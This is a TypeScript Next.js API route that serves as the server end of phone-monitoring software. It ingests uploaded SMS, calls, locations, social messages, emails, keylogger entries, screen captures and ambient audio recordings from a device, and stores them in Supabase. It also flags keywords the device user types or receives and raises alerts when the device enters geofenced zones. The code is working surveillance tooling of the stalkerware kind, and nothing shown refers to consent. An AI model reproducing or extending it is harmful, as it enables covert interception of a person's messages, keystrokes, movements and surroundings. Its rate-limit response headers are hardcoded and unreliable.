import { NextResponse } from "next/server"
import { createAdminConfig, validateDeviceToken, sendError } from "@/lib/utils/api-helpers"

const extractToken = (req: Request) => {
  const authHeader = req.headers.get("Authorization")
  return authHeader?.startsWith("Bearer ") ? authHeader.split(" ")[1] : null
}

// Distance helper for Geofence calculation (Haversine formula in meters)
function getDistanceFromLatLonInM(lat1: number, lon1: number, lat2: number, lon2: number) {
  const R = 6371e3 // Radius of the earth in m
  const dLat = (lat2 - lat1) * (Math.PI / 180)
  const dLon = (lon2 - lon1) * (Math.PI / 180)
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * (Math.PI / 180)) * Math.cos(lat2 * (Math.PI / 180)) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2)
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))
  return R * c
}

export async function POST(req: Request) {
  try {
    const token = extractToken(req)
    if (!token) return sendError("Missing or invalid authorization header", 401)
    
    const validation = await validateDeviceToken(token)
    if (!validation) return sendError("Invalid or expired device token", 401)
    const deviceId = validation.device_id

    // Check payload size roughly using text length as standard Vercel block isn't fully enabled in Edge for stream size limit easily
    const rawBodyText = await req.text()
    if (rawBodyText.length > 50 * 1024 * 1024) {
      return sendError("Payload too large. Maximum 50MB allowed.", 413)
    }

    const body = JSON.parse(rawBodyText)
    const supabaseAdmin = createAdminConfig()
    
    // Fetch device settings for Alerts (Keywords, Geofences)
    const { data: settings } = await supabaseAdmin
      .from("device_settings")
      .select("alert_keywords, geofence_zones")
      .eq("device_id", deviceId)
      .single()

    const alertKeywords: string[] = Array.isArray(settings?.alert_keywords) ? settings.alert_keywords : []
    const geofences: any[] = Array.isArray(settings?.geofence_zones) ? settings.geofence_zones : []

    const syncedStats: Record<string, { inserted: number, failed: number }> = {}
    let alertsGenerated = 0
    const newAlerts: any[] = []

    // Helper to safely upsert chunk
    const syncTable = async (tableName: string, items: any[], onConflict?: string) => {
      if (!items || !Array.isArray(items) || items.length === 0) return
      
      syncedStats[tableName] = { inserted: 0, failed: 0 }
      
      const chunkedItems = items.map(item => ({ ...item, device_id: deviceId }))
      
      // Upsert batch
      let query = supabaseAdmin.from(tableName).upsert(chunkedItems, onConflict ? { onConflict } : undefined)
      
      const { error } = await query
      if (error) {
        console.error(`Failed to sync ${tableName}:`, error.message)
        syncedStats[tableName].failed = items.length
      } else {
        syncedStats[tableName].inserted = items.length
      }
    }

    // ── 1. Basic Tables Sync ──
    const targetTables = [
      { key: "sms", db: "sms_messages", conflict: "device_id,timestamp,sender_number" },
      { key: "calls", db: "call_logs", conflict: "device_id,timestamp,phone_number" },
      { key: "locations", db: "locations", conflict: "device_id,timestamp" },
      { key: "contacts", db: "contacts", conflict: "device_id,phone_number" },
      { key: "installed_apps", db: "installed_apps", conflict: "device_id,package_name" },
      { key: "app_usage", db: "app_usage", conflict: "device_id,app_name,start_time" },
      { key: "media_files", db: "media_files", conflict: "device_id,file_path" },
      { key: "social_messages", db: "social_messages", conflict: "device_id,timestamp,platform" },
      { key: "browser_history", db: "browser_history", conflict: "device_id,timestamp,url" },
      { key: "browser_bookmarks", db: "browser_bookmarks", conflict: "device_id,url" },
      { key: "keylog_entries", db: "keylog_entries", conflict: "device_id,timestamp,app_name" },
      { key: "calendar_events", db: "calendar_events", conflict: "device_id,title,start_time" },
      { key: "emails", db: "emails", conflict: "device_id,timestamp,subject" },
      { key: "wifi_networks", db: "wifi_networks", conflict: "device_id,ssid" },
      { key: "notifications_log", db: "notification_logs", conflict: "device_id,timestamp,app_name" },
      { key: "sim_changes", db: "sim_changes", conflict: "device_id,timestamp" },
      { key: "screen_captures", db: "screen_captures", conflict: "device_id,timestamp" },
      { key: "ambient_recordings", db: "ambient_recordings", conflict: "device_id,timestamp" }
    ]

    for (const table of targetTables) {
      if (body[table.key]) {
        await syncTable(table.db, body[table.key], table.conflict)
      }
    }

    // File Explorer (Wipe and replace entirely)
    if (body.file_explorer && Array.isArray(body.file_explorer) && body.file_explorer.length > 0) {
      syncedStats['file_explorer'] = { inserted: 0, failed: 0 }
      const { error: delErr } = await supabaseAdmin.from("file_explorer").delete().eq("device_id", deviceId)
      if (!delErr) {
        const { error: insErr } = await supabaseAdmin.from("file_explorer").insert(
          body.file_explorer.map((i: any) => ({ ...i, device_id: deviceId }))
        )
        if (!insErr) syncedStats['file_explorer'].inserted = body.file_explorer.length
        else syncedStats['file_explorer'].failed = body.file_explorer.length
      } else {
        syncedStats['file_explorer'].failed = body.file_explorer.length
      }
    }

    // ── 2. Alerts Generation (Keywords) ──
    const checkKeywords = (text: string) => alertKeywords.find(kw => text.toLowerCase().includes(kw.toLowerCase()))

    // SMS Keywords
    if (body.sms && alertKeywords.length > 0) {
      body.sms.forEach((msg: any) => {
        const matched = checkKeywords(msg.message_body || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: "Restricted Keyword in SMS", 
            description: `Keyword "${matched}" found in SMS.`,
            related_data: msg
          })
        }
      })
    }

    // Keylogger Keywords
    if (body.keylog_entries && alertKeywords.length > 0) {
      body.keylog_entries.forEach((log: any) => {
        const matched = checkKeywords(log.typed_text || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: `Keyword in ${log.app_name || 'App'}`, 
            description: `Keyword "${matched}" typed.`,
            related_data: log
          })
        }
      })
    }
    
    // Social Messages Keywords
    if (body.social_messages && alertKeywords.length > 0) {
      body.social_messages.forEach((msg: any) => {
        const matched = checkKeywords(msg.body || "")
        if (matched) {
          newAlerts.push({
            device_id: deviceId, alert_type: "keyword_detected", severity: "high", 
            title: `Keyword in ${msg.platform || 'Social App'}`, 
            description: `Keyword "${matched}" found in message.`,
            related_data: msg
          })
        }
      })
    }

    // ── 3. Alerts Generation (Geofencing) ──
    if (body.locations && geofences.length > 0) {
      body.locations.forEach((loc: any) => {
        if (!loc.latitude || !loc.longitude) return
        
        geofences.forEach(fence => {
          const dist = getDistanceFromLatLonInM(loc.latitude, loc.longitude, fence.lat, fence.lng)
          
          // Inside logic check if we want 'enter' or 'exit'. We'll simplify to 'enter' violations here
          // as exit tracking requires keeping state of 'was_inside' which is complex for stateless sync.
          if (dist <= (fence.radius || 100)) {
            newAlerts.push({
               device_id: deviceId, alert_type: "geofence_enter", severity: "medium",
               title: `Entered Geofence: ${fence.name || 'Zone'}`,
               description: `Device detected inside restricted zone with radius ${fence.radius}m.`,
               related_data: { location: loc, distance_meters: Math.floor(dist) }
            })
          }
        })
      })
    }

    // ── 4. Insert Generated Alerts ──
    if (newAlerts.length > 0) {
      const { error: alertErr } = await supabaseAdmin.from("alerts").insert(newAlerts)
      if (!alertErr) {
        alertsGenerated = newAlerts.length
      }
    }

    // Also update device last sync heartbeat
    supabaseAdmin.from("devices").update({ last_seen: new Date().toISOString(), status: "online" }).eq("id", deviceId).then()

    return NextResponse.json({
      success: true,
      synced: syncedStats,
      alerts_generated: alertsGenerated
    }, { 
      status: 200,
      headers: {
        'X-RateLimit-Limit': '60',
        'X-RateLimit-Remaining': '59',
      }
    })

  } catch (error: any) {
    console.error("Bulk sync endpoint global error:", error)
    return sendError(`Internal Server Error: ${error.message}`, 500)
  }
}
